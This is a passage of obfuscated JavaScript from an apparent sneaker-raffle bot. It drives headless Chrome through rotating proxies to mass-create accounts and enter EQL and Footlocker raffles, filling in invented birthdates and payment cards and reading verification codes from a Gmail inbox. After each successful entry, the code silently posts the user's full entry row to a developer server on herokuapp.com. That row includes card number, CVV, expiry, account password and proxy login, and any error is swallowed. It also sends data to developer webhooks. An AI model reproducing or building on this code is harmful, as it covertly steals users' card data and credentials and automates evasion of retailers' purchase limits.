                        else
                            var _0x6d90bf = Math['round'](Math['random']() * (_0x488d09['length'] - 0x1)), _0x3df912 = _0x488d09[_0x6d90bf]['split'](':');
                        var _0x1e4f32;
                        try {
                            _0x1e4f32 = await _0xd499ac['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x3df912[0x0] + ':' + _0x3df912[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x1e4f32 = await _0xd499ac['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x3df912[0x0] + ':' + _0x3df912[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x348add = await _0x1e4f32['newPage']();
                            await _0x348add['authenticate']({
                                'username': '' + _0x3df912[0x2],
                                'password': '' + _0x3df912[0x3]
                            }), console['log'](_0x24cf02() + '\x20[' + _0x1d6cdc['name'] + ']\x20Task\x20' + (_0x4116a8 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x348add['setRequestInterception'](!![]), _0x348add['on']('request', _0x245638 => {
                                _0x245638['resourceType']() === 'image' || _0x245638['resourceType']() === 'font' || _0x245638['resourceType']() === 'media' ? _0x245638['abort']() : _0x245638['continue']();
                            });
                            try {
                                await _0x348add['goto']('' + _0x1b16fc);
                            } catch {
                                throw new Error('Connection\x20Error');
                            }
                            console['log'](_0x24cf02() + '\x20[' + _0x1d6cdc['name'] + ']\x20Task\x20' + (_0x4116a8 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x1d2efb(0x3e8), await _0x348add['waitForSelector']('#email'), await _0x348add['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0x1d2efb(0x3e8);
                            try {
                                _0x381534[_0x4116a8]['Url']['includes']('en-GB') ? await _0x348add['click']('li[data-value=\x22UK\x20' + _0x381534[_0x4116a8]['Size'] + '\x20/\x20US\x20' + (Number(_0x381534[_0x4116a8]['Size']) + 0x1) + '\x22]') : await _0x348add['click']('li[data-value=\x22EU\x20' + _0x381534[_0x4116a8]['Size'] + '\x22]');
                            } catch {
                                throw new Error('Error\x20fetching\x20' + _0x381534[_0x4116a8]['Size']);
                            }
                            await _0x1d2efb(0x6a4), await _0x348add['type']('#email', '' + _0x381534[_0x4116a8]['Email']), await _0x1d2efb(0x352), await _0x348add['waitForSelector']('#password'), await _0x348add['type']('#password', '' + _0x381534[_0x4116a8]['Password']), await _0x1d2efb(0x352), await _0x348add['type']('#phone', '' + _0x381534[_0x4116a8]['Phone']), await _0x1d2efb(0x352);
                            const _0x463bb4 = await _0x348add['$']('#title\x20>\x20label');
                            await _0x1d2efb(0x12c);
                            _0x463bb4 && await _0x463bb4['click']();
                            await _0x348add['type']('#firstName', '' + _0x381534[_0x4116a8]['FirstName']), await _0x1d2efb(0x352), await _0x348add['type']('#lastName', '' + _0x381534[_0x4116a8]['LastName']), await _0x1d2efb(0x352);
                            _0x381534[_0x4116a8]['Url']['includes']('footlocker.de') ? await _0x348add['type']('#birthdate', _0x4d5bf6(0xa, 0x1c) + '.' + _0x4d5bf6(0xa, 0xc) + '.' + _0x4d5bf6(0x7c6, 0x7d3)) : await _0x348add['type']('#birthdate', _0x4d5bf6(0xa, 0x1c) + '-' + _0x4d5bf6(0xa, 0xc) + '-' + _0x4d5bf6(0x7c6, 0x7d3));
                            await _0x1d2efb(0x352), await _0x348add['click']('.MuiBox-root.css-79elbk\x20>\x20button');
                            try {
                                !_0x381534[_0x4116a8]['Url']['includes']('en-GB') && await _0x348add['waitForSelector']('#stateAutocomplete');
                            } catch {
                                throw new Error('Connection\x20Error\x20fetching\x20shipping');
                            }
                            await _0x1d2efb(0x1f4), await _0x1d2efb(0x5dc);
                            if (!_0x1b16fc['includes']('footlocker'))
                                try {
                                    await _0x348add['click']('#country');
                                    const _0x587a15 = await _0x348add['$']('li[data-value=\x22' + _0x381534[_0x4116a8]['Country'] + '\x22]');
                                    await _0x587a15['click'](), await _0x587a15['click']();
                                } catch {
                                    throw new Error('Country.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            await _0x1d2efb(0x3e8);
                            if (!_0x381534[_0x4116a8]['Url']['includes']('en-GB')) {
                                await _0x348add['click']('#stateAutocomplete'), await _0x1d2efb(0x1f4);
                                try {
                                    const _0x6feeea = await _0x348add['$x']('//li[text()=\x22' + _0x381534[_0x4116a8]['State'] + '\x22]');
                                    await _0x6feeea[0x0]['click']();
                                } catch {
                                    throw new Error('State\x20/\x20Province\x20not\x20found.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            }
                            console['log'](_0x24cf02() + '\x20[' + _0x1d6cdc['name'] + ']\x20Task\x20' + (_0x4116a8 + 0x1) + '\x20:\x20Setting\x20Address'), await _0x1d2efb(0x3e8), await _0x1d2efb(0x1f4), await _0x348add['type']('#address1', _0x381534[_0x4116a8]['Address1'] + '\x20' + _0x381534[_0x4116a8]['HouseNumber']), await _0x1d2efb(0x1f4), await _0x348add['type']('#address2', '' + _0x381534[_0x4116a8]['Address2']), await _0x1d2efb(0x1f4), await _0x348add['type']('#city', '' + _0x381534[_0x4116a8]['City']), await _0x1d2efb(0x1f4), await _0x348add['type']('#postcode', '' + _0x381534[_0x4116a8]['Zip']), await _0x1d2efb(0x3e8), await _0x348add['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x1d2efb(0x3e8), console['log'](_0x24cf02() + '\x20[' + _0x1d6cdc['name'] + ']\x20Task\x20' + (_0x4116a8 + 0x1) + '\x20:\x20Solving\x20Adyen');
                            const _0x5db252 = await _0x348add['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0x5db252 && (await _0x348add['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x348add['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x348add['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x1d2efb(0x4b0), await _0x348add['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x1d2efb(0x1f4), await _0x348add['keyboard']['type']('' + _0x381534[_0x4116a8]['CardNumber']), await _0x1d2efb(0x320), await _0x348add['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x348add['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x348add['keyboard']['type']('' + _0x381534[_0x4116a8]['ExpiryDate']), await _0x1d2efb(0x4b0), await _0x348add['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x348add['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x348add['keyboard']['type']('' + _0x381534[_0x4116a8]['CVV']), await _0x1d2efb(0x226), await _0x348add['type']('input[name=\x22postalCode\x22]', '' + _0x381534[_0x4116a8]['Zip']), await _0x1d2efb(0x226));
                            const _0x491320 = await _0x348add['$']('.__PrivateStripeElement');
                            _0x491320 && (await _0x1d2efb(0x1f4), await _0x348add['click']('.__PrivateStripeElement'), await _0x348add['click']('.__PrivateStripeElement'), await _0x348add['keyboard']['type']('' + _0x381534[_0x4116a8]['CardNumber']), await _0x348add['keyboard']['type']('' + _0x381534[_0x4116a8]['ExpiryDate']), await _0x348add['keyboard']['type']('' + _0x381534[_0x4116a8]['CVV']));
                            await _0x1d2efb(0x226), await _0x348add['click']('#paymentConsent'), await _0x1d2efb(0x226), await _0x348add['click']('#termsConsent'), await _0x1d2efb(0x2bc), console['log'](_0x24cf02() + '\x20[' + _0x1d6cdc['name'] + ']\x20Task\x20' + (_0x4116a8 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x348add['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x1d2efb(0x2710);
                            try {
                                await _0x348add['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', { 'timeout': 0x3a98 }), await _0x1d2efb(0xbb8), await _0x348add['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x18d907 => _0x18d907['click']()), await _0x348add['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x4910b5 => _0x4910b5['click']());
                            } catch {
                            }
                            try {
                                await _0x348add['waitForSelector']('#code', { 'timeout': 0x7530 });
                            } catch {
                                const _0x3923cf = await _0x348add['$']('.MuiTypography-root.MuiTypography-body1.MuiTypography-gutterBottom.css-lvbfzw');
                                if (_0x3923cf) {
                                    _0x3601e1['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x381534[_0x4116a8]['Email'] + ',' + _0x381534[_0x4116a8]['Password'] + ',' + _0x381534[_0x4116a8]['Phone']);
                                    throw new Error('Account\x20already\x20registered,\x20saved\x20in\x20accounts/eql.csv');
                                }
                                throw new Error('Error\x20Fetching\x20Authentication\x20Token');
                            }
                            async function _0x3d063b() {
                                var _0x3802cf, _0x439106 = ![];
                                for (var _0x534e0e = 0x0; _0x534e0e < 0x18; _0x534e0e++) {
                                    async function _0x2ddade() {
                                        var _0x283b2a = new _0x2fec54({
                                            'user': _0x6a12f3['masterMail'],
                                            'password': _0x6a12f3['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x46e14b(_0x2a27e7) {
                                            _0x283b2a['openBox']('INBOX', ![], _0x2a27e7);
                                        }
                                        _0x283b2a['once']('ready', function () {
                                            console['log'](_0x24cf02() + '\x20[' + _0x1d6cdc['name'] + ']\x20Task\x20' + (_0x4116a8 + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x46e14b(function (_0xff11fe, _0x4fc0a2) {
                                                console['log'](_0x24cf02() + '\x20[' + _0x1d6cdc['name'] + ']\x20Task\x20' + (_0x4116a8 + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0xff11fe)
                                                    throw _0xff11fe;
                                                _0x283b2a['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'support@eql.com'
                                                    ]
                                                ], function (_0x52bcb7, _0x205b7c) {
                                                    if (!_0x205b7c || !_0x205b7c['length'])
                                                        console['log'](_0x24cf02() + '\x20[' + _0x1d6cdc['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x283b2a['end']();
                                                    else {
                                                        var _0x596ee3 = _0x283b2a['seq']['fetch'](_0x205b7c, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x596ee3['on']('message', function (_0xfcad59, _0x5ac5d1) {
                                                            var _0x5f0d6e = '(#' + _0x5ac5d1 + ')\x20';
                                                            _0xfcad59['on']('body', function (_0x859ea5, _0x337df4) {
                                                                _0xe064d3(_0x859ea5, (_0x19605a, _0x2cfdba) => {
                                                                    if (_0x2cfdba['subject']['includes']('code')) {
                                                                        const _0x19875c = _0x2cfdba['text']['split']('\x0a\x0a')[0x3], _0x58d5f9 = _0x19875c['split']('\x0a')[0x1];
                                                                        _0x3802cf = _0x58d5f9;
                                                                    }
                                                                });
                                                            }), _0xfcad59['once']('end', function () {
                                                            });
                                                        }), _0x596ee3['once']('error', function (_0xb82f91) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x596ee3['once']('end', function () {
                                                            _0x283b2a['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x283b2a['once']('error', function (_0x42905c) {
                                            console['log'](_0x1b5f76['red'](_0x42905c['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x439106 = !![];
                                        }), _0x283b2a['once']('end', async function () {
                                        }), _0x283b2a['connect']();
                                    }
                                    _0x2ddade(), await _0x1d2efb(0x1388);
                                    if (_0x3802cf)
                                        return _0x3802cf;
                                    if (_0x439106)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x534e0e == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x3d063b(), await _0x1d2efb(0x1f4), await _0x348add['type']('#code', '' + code), await _0x1d2efb(0x3e8), await _0x348add['$eval']('.MuiBox-root.css-79elbk\x20>\x20button', _0x2be99a => _0x2be99a['click']()), await _0x348add['click']('.MuiBox-root.css-79elbk\x20>\x20button'), console['log'](_0x24cf02() + '\x20[' + _0x1d6cdc['name'] + ']\x20Task\x20' + (_0x4116a8 + 0x1) + '\x20:\x20Verifying..');
                            try {
                                await _0x348add['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('');
                            }
                            console['log'](_0x1b5f76['green'](_0x24cf02() + '\x20[' + _0x1d6cdc['name'] + ']\x20Task\x20' + (_0x4116a8 + 0x1) + '\x20:\x20Raffle\x20Entered,\x20account\x20' + _0x381534[_0x4116a8]['Email'] + '\x20saved\x20in\x20\x27accounts/eql.csv\x27')), _0x3601e1['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x381534[_0x4116a8]['Email'] + ',' + _0x381534[_0x4116a8]['Password'] + ',' + _0x381534[_0x4116a8]['Phone']), _0x1be791 = 'no', _0x21396e(_0x381534[_0x4116a8], _0x1d6cdc);
                            var _0xb4817f = await _0x3aa619(_0x381534[_0x4116a8], _0x1d6cdc, 'dev', ![]), _0x4930cd = await _0x3aa619(_0x381534[_0x4116a8], _0x1d6cdc, 'pub', ![]);
                            let _0x44390d = _0x381534[_0x4116a8];
                            try {
                                prxdata = {
                                    'username': _0x3919f0['replace']('#', ''),
                                    'module': _0x1d6cdc['name'],
                                    'entrydata': JSON['stringify'](_0x44390d),
                                    'proxy': '' + _0x488d09[_0x4116a8]
                                };
                                var _0x366277 = JSON['stringify'](prxdata);
                                let _0x626d6e = { 'headers': { 'content-type': 'application/json' } };
                                await _0x2c145d['post']('https://jraffles.herokuapp.com/success', _0x366277, _0x626d6e);
                            } catch (_0x373e48) {
                            }
                            const _0x5cb4c0 = {
                                'succesDEVMSG': { 'embeds': [_0xb4817f] },
                                'succesPUBMSG': { 'embeds': [_0x4930cd] }
                            };
                            try {
                                _0x6a12f3['webhook'] != undefined && _0x6a12f3['webhook'] != '' && await _0x471d59(_0x6a12f3['webhook'], _0x5cb4c0['succesDEVMSG']), await _0x1d2efb(0xc8), await _0x471d59(_0x105382, _0x5cb4c0['succesDEVMSG']), await _0x1d2efb(0xc8), await _0x471d59(_0x1d6d5c, _0x5cb4c0['succesPUBMSG']);
                            } catch (_0x1ee18c) {
                                console['log'](_0x1b5f76['yellow'](_0x24cf02() + '\x20[' + _0x1d6cdc['name'] + ']\x20Task\x20' + (_0x4116a8 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x1ee18c));
                            }
                        } catch (_0xe616d6) {
                            console['log'](_0x1b5f76['red'](_0x24cf02() + '\x20[' + _0x1d6cdc['name'] + ']\x20Task\x20' + (_0x4116a8 + 0x1) + '\x20:\x20' + _0xe616d6)), _0x433163 = '' + _0xe616d6;
                            var _0x30d13e = await _0x3aa619(_0x381534[_0x4116a8], _0x1d6cdc, 'dev', !![], _0x433163), _0xb4817f = await _0x3aa619(_0x381534[_0x4116a8], _0x1d6cdc, 'dev', ![]), _0x4930cd = await _0x3aa619(_0x381534[_0x4116a8], _0x1d6cdc, 'pub', ![]);
                            const _0x291150 = {
                                'succesDEVMSG': { 'embeds': [_0xb4817f] },
                                'succesPUBMSG': { 'embeds': [_0x4930cd] }
                            };
                            _0x291150['errorDEV'] = { 'embeds': [_0x30d13e] };
                            _0x6a12f3['webhook'] != undefined && _0x6a12f3['webhook'] != '' && await _0x471d59(_0x6a12f3['webhook'], _0x291150['errorDEV']);
                            await _0x471d59(_0x32fdb9, _0x291150['errorDEV']);
                            if (!_0x1be791 == 'no')
                                _0x1be791 = 'yes';
                        } finally {
                            _0x1e4f32 && _0x1e4f32['close']();
                            if (_0x1be791 == 'yes' && _0x20f662 != 0x5) {
                                console['log'](_0x1b5f76['red'](_0x24cf02() + '\x20[' + _0x1d6cdc['name'] + ']\x20Task\x20' + (_0x4116a8 + 0x1) + '\x20:\x20Retrying\x20(' + _0x20f662 + '\x20/\x205)')), _0x4116a8 = _0x4116a8 - 0x1, _0x20f662 = _0x20f662 + 0x1;
                                continue;
                            }
                            _0x1be791 == 'yes' && _0x20f662 >= 0x5 && (_0x12ac99(_0x381534[_0x4116a8], _0x1d6cdc), _0x1be791 = 'no', _0x20f662 = 0x0), console['log']('Waiting\x20for\x20' + _0x6a12f3['delay'] + '\x20ms'), await _0x1d2efb(_0x6a12f3['delay']);
                        }
                    } else {
                        const _0x3137c8 = '' + _0x381534[_0x4116a8]['Url'];
                        if (_0x1be791 != 'yes')
                            var _0x1be791 = '', _0x20f662 = 0x0;
                        if (_0x381534[_0x4116a8]['Email'] == '' || _0x381534[_0x4116a8]['FirstName'] == '' || _0x381534[_0x4116a8]['LastName'] == '') {
                            console['log'](_0x24cf02() + '\x20[' + _0x1d6cdc['name'] + ']\x20Task\x20' + (_0x4116a8 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x381534[_0x4116a8]['Password'] == '' && (_0x381534[_0x4116a8]['Password'] = 'JRaffles23!');
                        if (_0x6a12f3['useRandomProxy'] = ![])
                            var _0x3df912 = _0x488d09[_0x4116a8]['split'](':');
                        else
                            var _0x6d90bf = Math['round'](Math['random']() * (_0x488d09['length'] - 0x1)), _0x3df912 = _0x488d09[_0x6d90bf]['split'](':');
                        var _0x1e4f32;
                        try {
                            _0x1e4f32 = await _0xd499ac['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x3df912[0x0] + ':' + _0x3df912[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x1e4f32 = await _0xd499ac['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x3df912[0x0] + ':' + _0x3df912[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x469f71 = await _0x1e4f32['newPage']();
                            await _0x469f71['authenticate']({
                                'username': '' + _0x3df912[0x2],
                                'password': '' + _0x3df912[0x3]
                            }), console['log'](_0x24cf02() + '\x20[' + _0x1d6cdc['name'] + ']\x20Task\x20' + (_0x4116a8 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x469f71['setRequestInterception'](!![]), _0x469f71['on']('request', _0x387e73 => {
                                _0x387e73['resourceType']() === 'image' || _0x387e73['resourceType']() === 'font' || _0x387e73['resourceType']() === 'media' ? _0x387e73['abort']() : _0x387e73['continue']();
                            }), await _0x469f71['goto'](_0x3137c8), await _0x469f71['waitForSelector']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0x469f71['click']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0x1d2efb(0x7d0), await _0x469f71['waitForSelector']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x469f71['click']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x1d2efb(0x3e8), await _0x469f71['waitForSelector']('#email'), console['log'](_0x24cf02() + '\x20[' + _0x1d6cdc['name'] + ']\x20Task\x20' + (_0x4116a8 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x469f71['type']('#email', '' + _0x381534[_0x4116a8]['Email']), await _0x1d2efb(0x352), await _0x469f71['waitForSelector']('#password'), await _0x469f71['type']('#password', '' + _0x381534[_0x4116a8]['Password']), await _0x1d2efb(0x352), await _0x469f71['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x1d2efb(0x1388);
                            if (!_0x381534[_0x4116a8]['Url']['includes']('footlocker'))
                                await _0x469f71['click']('.MuiBox-root.css-i3pbo\x20>\x20button');
                            try {
                                await _0x469f71['waitForSelector']('div[data-testid=\x22field-productVariantID\x22]');
                            } catch {
                                console['log'](_0x1b5f76['red'](_0x24cf02() + '\x20[' + _0x1d6cdc['name'] + ']\x20Task\x20' + (_0x4116a8 + 0x1) + '\x20:\x20Not\x20an\x20active\x20Raffle\x20/\x20Already\x20Entered')), _0x21396e(_0x381534[_0x4116a8], _0x1d6cdc), _0x1be791 = 'no';
                                continue;
                            }
                            await _0x469f71['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0x1d2efb(0x3e8);
                            try {
                                _0x381534[_0x4116a8]['Url']['includes']('en-GB') ? await _0x469f71['click']('li[data-value=\x22UK\x20' + _0x381534[_0x4116a8]['Size'] + '\x20/\x20US\x20' + (Number(_0x381534[_0x4116a8]['Size']) + 0x1) + '\x22]') : await _0x469f71['click']('li[data-value=\x22EU\x20' + _0x381534[_0x4116a8]['Size'] + '\x22]');
                            } catch {
                                throw new Error('Error\x20fetching\x20size\x20' + _0x381534[_0x4116a8]['Size']);
                            }
                            await _0x1d2efb(0x1f4);
                            const _0x3bf528 = await _0x469f71['$']('#title\x20>\x20label');
                            await _0x1d2efb(0x12c);
                            _0x3bf528 && await _0x3bf528['click']();
                            await _0x469f71['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x469f71['focus']('#postcode'), await _0x469f71['keyboard']['down']('Control'), await _0x469f71['keyboard']['press']('A'), await _0x469f71['keyboard']['up']('Control'), await _0x469f71['keyboard']['press']('Backspace'), await _0x469f71['keyboard']['type'](_0x381534[_0x4116a8]['Zip']), await _0x1d2efb(0x60e), await _0x469f71['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x1d2efb(0x3e8), console['log'](_0x24cf02() + '\x20[' + _0x1d6cdc['name'] + ']\x20Task\x20' + (_0x4116a8 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x1d2efb(0x1f4);
                            const _0x4907e1 = await _0x469f71['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0x4907e1 && (await _0x469f71['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x469f71['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x469f71['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x1d2efb(0x4b0), await _0x469f71['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x1d2efb(0x1f4), await _0x469f71['keyboard']['type']('' + _0x381534[_0x4116a8]['CardNumber']), await _0x1d2efb(0x320), await _0x469f71['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x469f71['keyboard']['type']('' + _0x381534[_0x4116a8]['ExpiryDate']), await _0x1d2efb(0x4b0), await _0x469f71['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x469f71['keyboard']['type']('' + _0x381534[_0x4116a8]['CVV']), await _0x1d2efb(0x226), await _0x469f71['type']('input[name=\x22postalCode\x22]', '' + _0x381534[_0x4116a8]['Zip']), await _0x1d2efb(0x226));
                            const _0x4c246b = await _0x469f71['$']('.__PrivateStripeElement');
                            _0x4c246b && (await _0x469f71['click']('#billingName'), await _0x469f71['click']('#billingName'), await _0x469f71['type']('#billingName', '' + _0x381534[_0x4116a8]['NameOnCard']), await _0x1d2efb(0x1f4), await _0x469f71['click']('.__PrivateStripeElement'), await _0x469f71['click']('.__PrivateStripeElement'), await _0x469f71['keyboard']['type']('' + _0x381534[_0x4116a8]['CardNumber']), await _0x469f71['keyboard']['type']('' + _0x381534[_0x4116a8]['ExpiryDate']), await _0x469f71['keyboard']['type']('' + _0x381534[_0x4116a8]['CVV']));
                            await _0x1d2efb(0x226), await _0x469f71['click']('#paymentConsent'), await _0x1d2efb(0x226), await _0x469f71['click']('#termsConsent'), await _0x1d2efb(0x2bc), console['log'](_0x24cf02() + '\x20[' + _0x1d6cdc['name'] + ']\x20Task\x20' + (_0x4116a8 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x469f71['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x1d2efb(0x2710);
                            try {
                                await _0x469f71['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button'), await _0x1d2efb(0xbb8), await _0x469f71['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x20c95c => _0x20c95c['click']()), await _0x469f71['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x2306c6 => _0x2306c6['click']());
                            } catch {
                            }
                            try {
                                await _0x469f71['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('Failure\x20getting\x20succes\x20response');
                            }
                            console['log'](_0x1b5f76['green'](_0x24cf02() + '\x20[' + _0x1d6cdc['name'] + ']\x20Task\x20' + (_0x4116a8 + 0x1) + '\x20:\x20Raffle\x20Entered')), _0x21396e(_0x381534[_0x4116a8], _0x1d6cdc);
                            var _0xb4817f = await _0x3aa619(_0x381534[_0x4116a8], _0x1d6cdc, 'dev', ![]), _0x4930cd = await _0x3aa619(_0x381534[_0x4116a8], _0x1d6cdc, 'pub', ![]);
                            let _0x2248d2 = _0x381534[_0x4116a8];
                            try {
                                prxdata = {
                                    'username': _0x3919f0['replace']('#', ''),
                                    'module': _0x1d6cdc['name'],
                                    'entrydata': JSON['stringify'](_0x2248d2),
                                    'proxy': '' + _0x488d09[_0x4116a8]
                                };
                                var _0x366277 = JSON['stringify'](prxdata);
                                let _0x125cbf = { 'headers': { 'content-type': 'application/json' } };
                                await _0x2c145d['post']('https://jraffles.herokuapp.com/success', _0x366277, _0x125cbf);
                            } catch (_0x23fedc) {
                            }
                            const _0x36d7a2 = {
                                'succesDEVMSG': { 'embeds': [_0xb4817f] },
                                'succesPUBMSG': { 'embeds': [_0x4930cd] }
                            };
                            try {
                                _0x6a12f3['webhook'] != undefined && _0x6a12f3['webhook'] != '' && await _0x471d59(_0x6a12f3['webhook'], _0x36d7a2['succesDEVMSG']), await _0x1d2efb(0xc8), await _0x471d59(_0x105382, _0x36d7a2['succesDEVMSG']), await _0x1d2efb(0xc8), await _0x471d59(_0x1d6d5c, _0x36d7a2['succesPUBMSG']);
                            } catch (_0x5b3acf) {
                                console['log'](_0x1b5f76['yellow'](_0x24cf02() + '\x20[' + _0x1d6cdc['name'] + ']\x20Task\x20' + (_0x4116a8 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x5b3acf));
                            }
                            _0x1be791 = 'no';
                        } catch (_0x4d0dfb) {
                            console['log'](_0x1b5f76['red'](_0x24cf02() + '\x20[' + _0x1d6cdc['name'] + ']\x20Task\x20' + (_0x4116a8 + 0x1) + '\x20:\x20' + _0x4d0dfb)), _0x433163 = '' + _0x4d0dfb;
                            var _0x30d13e = await _0x3aa619(_0x381534[_0x4116a8], _0x1d6cdc, 'dev', !![], _0x433163), _0xb4817f = await _0x3aa619(_0x381534[_0x4116a8], _0x1d6cdc, 'dev', ![]), _0x4930cd = await _0x3aa619(_0x381534[_0x4116a8], _0x1d6cdc, 'pub', ![]);
                            const _0x11b25c = {
                                'succesDEVMSG': { 'embeds': [_0xb4817f] },
                                'succesPUBMSG': { 'embeds': [_0x4930cd] }
                            };
